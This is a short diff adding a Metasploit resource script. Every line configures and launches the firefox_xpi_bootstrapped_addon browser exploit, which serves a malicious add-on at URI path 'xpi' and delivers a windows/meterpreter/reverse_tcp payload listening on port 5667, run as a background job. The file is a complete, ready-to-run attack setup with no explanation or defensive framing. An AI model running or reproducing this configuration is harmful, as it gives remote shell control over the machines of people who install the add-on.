@@ -1,0 +1,9 @@
+use exploit/multi/browser/firefox_xpi_bootstrapped_addon
+set target 1
+set lport 5667
+set uripath xpi
+set payload windows/meterpreter/reverse_tcp
+
+exploit -j
+
+
